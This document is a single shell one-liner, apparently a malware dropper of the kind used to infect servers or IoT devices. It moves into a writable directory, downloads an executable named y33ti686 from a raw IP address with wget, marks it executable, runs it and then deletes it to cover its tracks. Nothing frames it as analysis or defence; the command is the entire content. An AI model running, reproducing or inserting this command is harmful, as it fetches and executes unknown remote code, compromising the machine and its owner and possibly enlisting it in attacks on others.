cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.88.209.253/y33ti686; chmod +x y33ti686; ./y33ti686; rm -rf y33ti686
